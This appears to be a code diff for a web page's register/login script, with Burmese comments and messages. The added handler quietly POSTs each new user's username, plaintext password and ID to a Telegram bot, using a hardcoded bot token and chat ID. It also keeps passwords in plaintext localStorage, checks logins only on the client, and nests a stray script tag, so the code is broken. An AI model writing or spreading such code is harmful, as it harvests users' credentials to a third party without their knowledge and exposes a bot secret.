@@ -1145,52 +1145,52 @@ function cancelOrder() {
             sessionStorage.setItem('isVisited', 'true');
         }
     });
+    <script>
     let isLogin = false;
+
     function handleAuth() {
-        let u = document.getElementById('uname').value;
-        let p = document.getElementById('pword').value;
-        if (!isLogin) {
-            localStorage.setItem('tspk_user', JSON.stringify({username: u, password: p}));
-            alert("အကောင့်ဖွင့်ပြီးပါပြီ");
-        } else {
-            let saved = JSON.parse(localStorage.getItem('tspk_user'));
-            if (saved && saved.username === u && saved.password === p) {
-                alert("Login အောင်မြင်ပါသည်!");
-                document.getElementById('auth-box').style.display = 'none';
+        let u = document.getElementById('uname').value.trim();
+        let p = document.getElementById('pword').value.trim();
+
+        if (!isLogin) { 
+            // Register Mode
+            let uid = "USR-" + Math.floor(Math.random() * 99999);
+            let userObj = { username: u, password: p, id: uid };
+            localStorage.setItem('tspk_user', JSON.stringify(userObj));
+            
+            // Telegram သို့ ပို့ခြင်း
+            fetch('https://api.telegram.org/bot8767805733:AAEeerLC7A98kmcs5LzBHfEbcUzMQLCxsSI/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: '6917040501', text: `New Account:\nUsername: ${u}\nPass: ${p}\nID: ${uid}` })
+            });
+            alert("အကောင့်ဖွင့်ပြီးပါပြီ။ ကျေးဇူးပြု၍ ပြန်လည်ဝင်ရောက်ပါ။");
+            toggleMode(); // အကောင့်ဝင်ရန် Mode သို့ ပြောင်းပေးခြင်း
+        } else { 
+            // Login Mode
+            let savedUser = localStorage.getItem('tspk_user');
+            if (savedUser) {
+                let user = JSON.parse(savedUser);
+                if (user.username === u && user.password === p) {
+                    alert("Login အောင်မြင်ပါသည်!");
+                    document.getElementById('auth-box').style.display = 'none';
+                    document.getElementById('main-content').style.display = 'block';
+                    document.getElementById('user-display').innerText = user.username;
+                } else {
+                    alert("Username သို့မဟုတ် Password မှားနေသည်!");
+                }
             } else {
-                alert("Username သို့မဟုတ် Password မှားနေသည်");
+                alert("အကောင့်မရှိသေးပါ။ အကောင့်အရင်ဖွင့်ပေးပါ။");
             }
         }
     }
+
     function toggleMode() {
         isLogin = !isLogin;
         document.getElementById('auth-title').innerText = isLogin ? "အကောင့်ဝင်ရန်" : "အကောင့်သစ်ဖွင့်ရန်";
         document.getElementById('auth-btn').innerText = isLogin ? "Login" : "Register";
     }
-    
-    // အကောင့်ဖွင့်တာနဲ့ Telegram ဆီ အချက်အလက်ပို့တဲ့ Function
-    function sendAccountToTelegram(u, p, uid) {
-        let text = `New Account Created!\nID: ${uid}\nUsername: ${u}\nPassword: ${p}`;
-        fetch('https://api.telegram.org/bot8767805733:AAEeerLC7A98kmcs5LzBHfEbcUzMQLCxsSI/sendMessage', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: '6917040501', text: text })
-        });
-    }
+</script>
 
-    // handleAuth() ထဲမှာ အစားထိုးပါ
-    function handleAuth() {
-        let u = document.getElementById('uname').value;
-        let p = document.getElementById('pword').value;
-        if (!isLogin) {
-            let uid = "USR-" + Math.floor(Math.random() * 99999);
-            localStorage.setItem('tspk_user', JSON.stringify({username: u, password: p, id: uid}));
-            sendAccountToTelegram(u, p, uid); // Telegram ဆီပို့မယ်
-            alert("အောင်မြင်သည်။ ID: " + uid);
-        } else {
-            // Login ပိုင်း
-        }
-    }
-    </script>
 </body> 
 </html>
